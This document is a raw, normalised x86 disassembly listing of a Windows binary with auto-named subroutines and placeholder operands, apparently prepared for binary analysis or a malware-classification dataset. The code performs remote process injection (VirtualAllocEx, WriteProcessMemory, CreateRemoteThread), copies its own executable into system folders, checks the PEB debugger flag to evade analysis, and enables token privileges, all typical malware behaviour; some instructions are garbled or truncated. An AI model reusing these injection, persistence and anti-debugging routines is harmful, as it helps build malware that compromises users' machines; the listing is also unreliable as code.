push 0x0
push esi
call [ VirtualAllocEx@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
retn
push 0x1000
call sub_40c210
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
push ecx
push edx
push edi
call sub_40af40
add esp 0xc
test eax eax
jg r-xdata
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn
mov ecx [ edi + 0x4 ]
lea eax [ esp + 0x14 ]
push eax
lea edx [ edi + 0x8 ]
push ecx
push edx
push ebx
push esi
call [ WriteProcessMemory@IAT ]
test eax eax
jne r-xdata
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn
lea eax [ esp + 0xc ]
push eax
push 0x0
push 0x0
push ebx
push 0x0
push 0x0
push esi
call [ CreateRemoteThread@IAT ]
push esi
mov ebx eax
call [ CloseHandle@IAT ]
push edi
call sub_40c22d
add esp 0x4
xor eax eax
test ebx ebx
pop edi
pop esi
setne al
pop ebx
pop ecx
retn
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn
sub_40af40
mov eax [ esp + 0xc ]
push esi
test eax eax
jne r-xdata
mov ecx [ esp + 0xc ]
mov esi [ esp + 0x8 ]
push eax
push ecx
push esi
call sub_40c4dc
add esp 0xc
push 0x4
push esi
call sub_40c6fa
mov eax [ esi + 0x4 ]
add esp 0x8
pop esi
retn
mov eax [ esp + 0xc ]
mov esi [ esp + 0x8 ]
push eax
push esi
call sub_40c75b
add esp 0x8
push 0x4
push esi
call sub_40c6fa
mov eax [ esi + 0x4 ]
add esp 0x8
pop esi
retn
sub_40af90
sub esp 0x600
push ebx
push edi
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x9 ]
mov [ esp + 0x8 ] 0x0
[ edi ]
stosw [ edi ]
push 0x6ae
stosb [ edi ]
call sub_406abc
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
mov ecx 0x1ab
xor eax eax
mov edi ebx
[ edi ]
stosw [ edi ]
mov eax [ esp + 0x610 ]
test eax eax
je r-xdata
pop edi
pop ebx
add esp 0x600
retn
mov eax [ esp + 0x614 ]
test eax eax
je r-xdata
push ebp
push esi
push eax
lea eax [ esp + 0x214 ]
push eax
call sub_409240
mov eax [ esp + 0x61c ]
add esp 0x8
test eax eax
je r-xdata
mov eax ebx
pop edi
pop ebx
add esp 0x600
retn
push 0x400
push eax
lea eax [ esp + 0x210 ]
push eax
call sub_4092f0
lea ecx [ esp + 0x270 ]
lea edx [ ebx + 0x30c ]
push ecx
push edx
call sub_4091f0
lea eax [ esp + 0x318 ]
lea ecx [ ebx + 0x3ac ]
push eax
push ecx
call sub_4091f0
mov dx [ esp + 0x460 ]
lea eax [ esp + 0x224 ]
lea ecx [ ebx + 0x2b0 ]
push eax
push ecx
mov [ ebx + 0x4ec ] dx
call sub_4091f0
lea edx [ esp + 0x234 ]
lea eax [ ebx + 0x2b8 ]
push edx
push eax
call sub_4091f0
lea ecx [ esp + 0x240 ]
lea edx [ ebx + 0x2bc ]
push ecx
push edx
call sub_4091f0
lea eax [ esp + 0x288 ]
lea ecx [ ebx + 0x2fc ]
push eax
push ecx
call sub_4091f0
lea edx [ esp + 0x298 ]
lea eax [ ebx + 0x304 ]
push edx
push eax
call sub_4091f0
add esp 0x44
lea ecx [ esp + 0x446 ]
lea edx [ ebx + 0x4ee ]
push ecx
push edx
call sub_4091f0
lea eax [ esp + 0x48e ]
lea ecx [ ebx + 0x52e ]
push eax
push ecx
call sub_4091f0
lea edx [ esp + 0x4d6 ]
lea eax [ ebx + 0x56e ]
push edx
push eax
call sub_4091f0
lea ecx [ esp + 0x4fe ]
lea edx [ ebx + 0x58e ]
push ecx
push edx
call sub_4091f0
lea eax [ esp + 0x546 ]
lea ecx [ ebx + 0x5ce ]
push eax
push ecx
call sub_4091f0
lea edx [ esp + 0x58e ]
lea eax [ ebx + 0x60e ]
push edx
push eax
call sub_4091f0
lea ecx [ esp + 0x5b6 ]
lea edx [ ebx + 0x62e ]
push ecx
push edx
call sub_4091f0
lea eax [ esp + 0x5fe ]
lea ecx [ ebx + 0x66e ]
push eax
push ecx
call sub_4091f0
add esp 0x40
push 0x0
lea edx [ esp + 0x114 ]
push 0x1a
push edx
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
lea eax [ esp + 0x210 ]
push rw-data
push eax
call sub_403660
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
push ecx
push ebx
call sub_4091f0
push rw-data
push 0x0
call sub_403660
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x28 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ ebx + 0x20 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x28 ]
push ecx
push edx
call sub_4091f0
lea eax [ ebx + 0x40 ]
push rw-data
push eax
call sub_4091f0
push rw-data
push 0x0
call sub_403660
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x40 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x140 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x40 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x140 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ ebx + 0x60 ]
push ecx
call sub_4091f0
push rw-data
push 0x0
call sub_403660
add esp 0x40
push rw-data
push 0x0
call sub_403660
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ ebx + 0xe0 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
push ecx
push edx
call sub_4091f0
push rw-data
push 0x0
call sub_403660
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x28 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x128 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x28 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x128 ]
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x128 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ ebx + 0x160 ]
push ecx
call sub_4091f0
add esp 0x20
lea ecx [ esp + 0x110 ]
push 0x100
push ecx
call [ GetSystemDirectoryA@IAT ]
lea edx [ esp + 0x210 ]
push rw-data
push edx
call sub_403660
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
push ecx
push ebx
call sub_4091f0
push rw-data
push 0x0
call sub_403660
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x28 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ ebx + 0x20 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x28 ]
push ecx
push edx
call sub_4091f0
mov eax [ esp + 0x640 ]
lea ecx [ esp + 0x30 ]
push eax
push ecx
call sub_409240
lea edx [ esp + 0x38 ]
lea eax [ ebx + 0x40 ]
push edx
push eax
call sub_4091f0
push rw-data
push 0x0
call sub_403660
push rw-data
push 0x0
call sub_403660
mov edi eax
or ecx 0xffffffff
xor eax eax
add esp 0x40
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x10 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
cmp [ esp + 0x10 ] 0x5c
jne r-xdata
lea eax [ esp + 0x110 ]
lea ecx [ ebx + 0x60 ]
push eax
push ecx
call sub_4091f0
push rw-data
push 0x0
call sub_403660
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x20 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ ebx + 0xe0 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x20 ]
push ecx
push edx
call sub_4091f0
push rw-data
push 0x0
call sub_403660
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x30 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x130 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea edx [ esp + 0x130 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x30 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
lea eax [ esp + 0x130 ]
[ edi ] [ esi ]
lea ecx [ ebx + 0x160 ]
push eax
push ecx
call sub_4091f0
add esp 0x28
jmp r-xdata
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x110 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov ecx 0x10
xor eax eax
lea edi [ ebx + 0x260 ]
lea edx [ ebx + 0x2a0 ]
push rw-data
push edx
[ edi ]
call sub_4091f0
add esp 0x8
pop esi
pop ebp
sub_40b5d0
sub esp 0x104
mov eax [ esp + 0x108 ]
push ebx
push ebp
push esi
push edi
push rw-data
push eax
mov [ esp + 0x18 ] 0x0
call sub_4039c6
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x104
retn
push 0x2
push 0x0
push esi
call sub_4038dc
push esi
call sub_405892
mov ebx eax
lea ecx [ ebx + 0x1 ]
push ecx
call sub_406abc
mov edi eax
add esp 0x14
test edi edi
jne r-xdata
cmp ebx 0x2710
lea eax [ ebx + ebx ]
jl r-xdata
push esi
call sub_403748
add esp 0x4
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
mov [ esp + 0x10 ] eax
inc eax
push eax
call sub_406abc
mov ebp eax
add esp 0x4
test ebp ebp
jne r-xdata
mov eax ebx
push 0x0
push 0x0
push esi
call sub_4038dc
push esi
push ebx
push 0x1
push edi
call sub_40c070
add esp 0x1c
cmp eax ebx
jne r-xdata
push esi
call sub_403748
push edi
call sub_404e2a
add esp 0x8
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
push esi
call sub_403748
push edi
call sub_404e2a
push ebp
call sub_404e2a
add esp 0xc
push eax
lea edx [ esp + 0x14 ]
push edi
push edx
push ebp
call sub_40e140
add esp 0x10
test eax eax
jl r-xdata
mov eax [ esp + 0x10 ]
push eax
push ebp
push edi
call sub_4092f0
push esi
call sub_403748
mov ecx [ esp + 0x130 ]
push rw-data
push ecx
call sub_4039c6
mov ebx eax
add esp 0x18
test ebx ebx
jne r-xdata
mov edx [ esp + 0x11c ]
lea eax [ esp + 0x14 ]
push edx
push eax
call sub_409240
push ebx
push 0x4
lea ecx [ esp + 0x24 ]
push 0x1
push ecx
call sub_4039d9
mov eax [ esp + 0x28 ]
lea edx [ esp + 0xac ]
push 0xa
push edx
push eax
call sub_408e96
lea ecx [ esp + 0xb8 ]
lea edx [ esp + 0x38 ]
push ecx
push edx
call sub_409240
push ebx
push 0xc
lea eax [ esp + 0x48 ]
push 0x1
push eax
call sub_4039d9
push ebx
call sub_404f7d
mov ecx [ esp + 0x50 ]
add esp 0x40
push esi
push ecx
push 0x1
push edi
call sub_40c010
push ebx
call sub_403748
push edi
call sub_404e2a
push ebp
call sub_404e2a
add esp 0x1c
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
sub_40b790
sub esp 0x110
mov eax [ esp + 0x114 ]
push ebx
push ebp
push esi
push edi
push rw-data
push eax
mov [ esp + 0x1c ] 0x0
call sub_4039c6
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x110
retn
push ebp
push 0x4
lea ecx [ esp + 0x28 ]
push 0x1
push ecx
call sub_4037c5
add esp 0x10
cmp eax 0x4
jne r-xdata
push ebp
call sub_403748
add esp 0x4
mov esi [ esp + 0x128 ]
lea ecx [ esp + 0x2c ]
push ecx
call sub_4037c5
add esp 0x10
cmp eax 0xc
jne r-xdata
lea edx [ esp + 0x2c ]
push edx
call sub_4037c5
add esp 0x10
cmp eax 0xc
jne r-xdata
lea edx [ esp + 0x20 ]
lea eax [ esp + 0xa0 ]
push edx
push eax
mov [ esp + 0x34 ] 0x0
call sub_409240
lea ecx [ esp + 0xa8 ]
push ecx
call sub_408f90
mov edx [ esp + 0x138 ]
push rw-data
push edx
mov ebx eax
call sub_4039c6
add esp 0x14
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
lea eax [ esp + 0x20 ]
lea ecx [ esp + 0xa0 ]
push eax
push ecx
mov [ esp + 0x34 ] 0x0
call sub_409240
lea edx [ esp + 0xa8 ]
push edx
call sub_408f90
push 0x1
push eax
push ebp
call sub_4038dc
add esp 0x18
test eax eax
jne r-xdata
lea edi [ ebx + ebx * 2 ]
shl edi 0x1
push edi
mov [ esp + 0x20 ] edi
call sub_406abc
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
push ebp
push 0x4
lea eax [ esp + 0x28 ]
push 0x1
push eax
call sub_4037c5
add esp 0x10
cmp eax 0x4
je r-xdata
lea ecx [ ebx + 0x1 ]
push ecx
call sub_406abc
add esp 0x4
mov [ esp + 0x18 ] eax
test eax eax
push ebp
jne r-xdata
push ebp
call sub_403748
mov eax [ esp + 0x14 ]
push eax
call sub_403748
add esp 0x8
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x110
retn
lea edx [ esp + 0x20 ]
lea eax [ esp + 0xa0 ]
push edx
push eax
mov [ esp + 0x2c ] 0x0
call sub_409240
lea ecx [ esp + 0xa8 ]
push esi
push ecx
call sub_408ec0
add esp 0x10
test eax eax
push ebp
push 0xc
push 0x1
je r-xdata
push ebx
push 0x1
push esi
call sub_40c070
mov eax [ esp + 0x28 ]
push ebx
push esi
push eax
mov [ esi + ebx ] 0x0
call sub_4092f0
mov ecx edi
xor eax eax
mov edx ecx
mov edi esi
shr ecx 0x2
[ edi ]
mov ecx edx
push ebx
and ecx 0x3
[ edi ]
mov edi [ esp + 0x38 ]
mov eax [ esp + 0x3c ]
lea ecx [ esp + 0x34 ]
push edi
push ecx
push esi
mov [ esp + 0x40 ] eax
call sub_40e1c0
add esp 0x2c
test eax eax
jge r-xdata
call sub_403748
mov edx [ esp + 0x14 ]
push edx
call sub_403748
push esi
call sub_404e2a
add esp 0xc
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x110
retn
mov ebx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
push ebx
push eax
push 0x1
push esi
call sub_40c010
push ebp
call sub_403748
push ebx
call sub_403748
push esi
call sub_404e2a
push edi
call sub_404e2a
add esp 0x20
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x110
retn
push ebp
call sub_403748
mov edx [ esp + 0x14 ]
push edx
call sub_403748
push esi
call sub_404e2a
push edi
call sub_404e2a
add esp 0x10
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x110
retn
sub_40ba10
sub esp 0x400
push ebx
push ebp
push esi
push edi
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x311 ]
mov [ esp + 0x310 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x211 ]
mov [ esp + 0x210 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x11 ]
mov [ esp + 0x10 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x111 ]
mov [ esp + 0x110 ] 0x0
[ edi ]
stosw [ edi ]
mov ebp [ esp + 0x41c ]
mov ebx [ esp + 0x418 ]
stosb [ edi ]
mov eax [ esp + 0x414 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x310 ]
push 0x100
push ecx
push 0x0
call [ GetModuleFileNameA@IAT ]
lea edx [ esp + 0x310 ]
push edx
call sub_4093c0
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x314 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov [ ecx + ebp - 0x4 ] al
lea ecx [ esp + 0x214 ]
push ecx
push edx
call sub_409410
add esp 0xc
mov edi ebx
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x210 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
push ebx
call sub_4093a0
add esp 0x4
test eax eax
jne r-xdata
mov esi [ esp + 0x424 ]
push esi
call sub_409380
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x210 ]
push ebx
push eax
call sub_408ec0
add esp 0x8
test eax eax
jne r-xdata
mov esi [ esp + 0x420 ]
lea edx [ esp + 0x10 ]
push esi
push ebx
push rw-data
push edx
call sub_403581
lea eax [ esp + 0x220 ]
push esi
push eax
lea ecx [ esp + 0x128 ]
push rw-data
push ecx
call sub_403581
lea edx [ esp + 0x130 ]
push edx
call sub_409380
mov edi [ CopyFileA@IAT ]
add esp 0x24
test eax eax
je r-xdata
push ebx
call sub_40be10
add esp 0x4
call sub_409610
test eax eax
je r-xdata
mov ecx [ esp + 0x420 ]
lea edx [ esp + 0x10 ]
push ecx
push ebx
push rw-data
push edx
call sub_403581
lea eax [ esp + 0x20 ]
push eax
call sub_409380
add esp 0x14
test eax eax
jne r-xdata
push ebp
push ebx
lea edx [ esp + 0x18 ]
push rw-data
push edx
call sub_403581
lea eax [ esp + 0x220 ]
push ebp
push eax
lea ecx [ esp + 0x128 ]
push rw-data
push ecx
call sub_403581
lea edx [ esp + 0x130 ]
push edx
call sub_409380
add esp 0x24
test eax eax
je r-xdata
lea eax [ esp + 0x10 ]
push 0x0
lea ecx [ esp + 0x114 ]
push eax
push ecx
call edi
mov ecx [ esp + 0x420 ]
push esi
push ecx
push ebp
push ebx
call sub_40bf20
push esi
push 0x0
call sub_409470
add esp 0x18
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x400
retn
push ebp
push ebx
lea edx [ esp + 0x18 ]
push rw-data
push edx
call sub_403581
lea eax [ esp + 0x20 ]
push eax
call sub_409380
add esp 0x14
test eax eax
jne r-xdata
push ebp
push ebx
lea eax [ esp + 0x18 ]
push rw-data
push eax
call sub_403581
lea ecx [ esp + 0x20 ]
push ecx
call sub_409380
add esp 0x14
test eax eax
jne r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
push esi
call sub_40b790
add esp 0xc
test eax eax
jge r-xdata
push ebp
push ebx
lea edx [ esp + 0x18 ]
push rw-data
push edx
call sub_403581
lea eax [ esp + 0x220 ]
push ebp
push eax
lea ecx [ esp + 0x128 ]
push rw-data
push ecx
call sub_403581
lea edx [ esp + 0x130 ]
push edx
call sub_409380
add esp 0x24
test eax eax
je r-xdata
lea eax [ esp + 0x10 ]
push 0x0
lea ecx [ esp + 0x114 ]
push eax
push ecx
call edi
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x400
retn
call sub_409610
test eax eax
je r-xdata
lea edx [ esp + 0x10 ]
push edx
push rw-data
push esi
call sub_40b790
lea eax [ esp + 0x1c ]
push eax
push 0x0
call sub_409470
add esp 0x14
lea edx [ esp + 0x10 ]
push edx
push 0x0
call sub_409470
add esp 0x8
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x400
retn
mov edx [ esp + 0x424 ]
push edx
push esi
push ebp
push ebx
call sub_40bf20
add esp 0x10
lea eax [ esp + 0x10 ]
push 0x0
lea ecx [ esp + 0x114 ]
push eax
push ecx
call edi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x400
retn
push ebp
push ebx
lea ecx [ esp + 0x18 ]
push rw-data
push ecx
call sub_403581
lea edx [ esp + 0x20 ]
push edx
call sub_409380
add esp 0x14
test eax eax
jne r-xdata
lea eax [ esp + 0x10 ]
push eax
push rw-data
push esi
call sub_40b790
add esp 0xc
test eax eax
jge r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push 0x0
call sub_409470
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x400
retn
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x400
retn
sub_40be10
sub esp 0x200
push ebx
push ebp
push esi
push edi
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x11 ]
mov [ esp + 0x10 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi [ esp + 0x214 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x110 ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x114 ]
push ecx
call sub_403660
mov edx eax
or ecx 0xffffffff
mov edi edx
xor eax eax
add esp 0x8
lea ebx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
test edx edx
[ edi ] [ esi ]
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x200
retn
mov ebx [ CreateDirectoryA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea ebp [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi ebp
mov ebp ecx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea ebp [ esp + 0x10 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
call ebx
push rw-data
push 0x0
call sub_403660
mov edx eax
add esp 0x8
test edx edx
je r-xdata
sub_40bf20
sub esp 0x100
push ebx
push esi
push edi
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0xd ]
mov [ esp + 0xc ] 0x0
mov ebx [ esp + 0x11c ]
[ edi ]
stosw [ edi ]
push ebx
stosb [ edi ]
call [ DeleteFileA@IAT ]
mov eax [ esp + 0x118 ]
mov esi [ esp + 0x110 ]
push eax
push esi
lea ecx [ esp + 0x14 ]
push rw-data
push ecx
call sub_403581
lea edx [ esp + 0x1c ]
push edx
call sub_409380
add esp 0x14
test eax eax
je r-xdata
mov edi [ esp + 0x114 ]
lea ecx [ esp + 0xc ]
push edi
push esi
push rw-data
push ecx
call sub_403581
lea edx [ esp + 0x1c ]
push edx
call sub_409380
add esp 0x14
test eax eax
je r-xdata
push ebx
lea eax [ esp + 0x10 ]
push rw-data
push eax
call sub_40b5d0
add esp 0xc
push edi
push esi
lea ecx [ esp + 0x14 ]
push rw-data
push ecx
call sub_403581
lea edx [ esp + 0x1c ]
push edx
call sub_409380
add esp 0x14
test eax eax
je r-xdata
push ebx
lea eax [ esp + 0x10 ]
push rw-data
push eax
call sub_40b5d0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x100
retn
push ebx
lea eax [ esp + 0x10 ]
push rw-data
push eax
call sub_40b5d0
add esp 0xc
sub_40c010
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
xor ebp ebp
xor edi edi
test esi esi
jle r-xdata
mov edx [ esp + 0x1c ]
push edx
call sub_404f7d
add esp 0x4
mov eax ebp
pop edi
pop esi
pop ebp
retn
push ebx
mov ebx [ esp + 0x18 ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x14 ]
push ecx
sub esi eax
push eax
lea eax [ edi + edx ]
push ebx
push eax
call sub_4039d9
mov ecx eax
add esp 0x10
imul ecx ebx
add edi ecx
add ebp eax
test esi esi
jg r-xdata
mov eax 0x7530
cmp esi 0x7530
mov eax esi
jle r-xdata
pop ebx
sub_40c070
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
xor ebp ebp
xor edi edi
test esi esi
jle r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
retn
push ebx
mov ebx [ esp + 0x18 ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x14 ]
push ecx
sub esi eax
push eax
lea eax [ edi + edx ]
push ebx
push eax
call sub_4037c5
mov ecx eax
add esp 0x10
imul ecx ebx
add edi ecx
add ebp eax
test esi esi
jg r-xdata
mov eax 0x7530
cmp esi 0x7530
mov eax esi
jle r-xdata
pop ebx
pop edi
mov eax ebp
pop esi
pop ebp
retn
sub_40c0d0
sub esp 0x150
lea eax [ esp + 0x50 ]
push rw-data
push eax
call sub_409240
lea ecx [ esp + 0x58 ]
push rw-data
push ecx
call sub_403660
add esp 0x10
test eax eax
je r-xdata
xor eax eax
add esp 0x150
retn
lea edx [ esp ]
push 0x0
push edx
push eax
call sub_40e6e0
add esp 0xc
test eax eax
jne r-xdata
mov eax 0x1
add esp 0x150
retn
push rw-data
push eax
call sub_403660
add esp 0x8
test eax eax
jne r-xdata
sub_40c140
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
push eax
mov eax [ fs : 0x30 ]
movzx eax [ eax + 0x68 ]
and eax 0x70
test eax eax
je r-xdata
pop eax
mov ecx [ ebp - 0x4 ]
xor eax eax
test ecx ecx
setne al
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0x1
sub_40c180
sub esp 0x1c
lea eax [ esp ]
push eax
push 0x28
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
add esp 0x1c
retn
lea ecx [ esp + 0x4 ]
push ecx
push rw-data
push 0x0
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push 0x0
push 0x0
lea edx [ esp + 0x14 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x8 ]
push 0x10
push edx
push 0x0
push eax
mov [ esp + 0x24 ] 0x1
mov [ esp + 0x2c ] ecx
mov [ esp + 0x30 ] 0x2
call [ AdjustTokenPrivileges@IAT ]
mov ecx [ esp ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ esp ]
push edx
call [ CloseHandle@IAT ]
add esp 0x1c
retn
sub_40c210
push esi
mov esi [ esp + 0x8 ]
lea eax [ esi + 0x8 ]
push eax
call sub_406abc
test eax eax
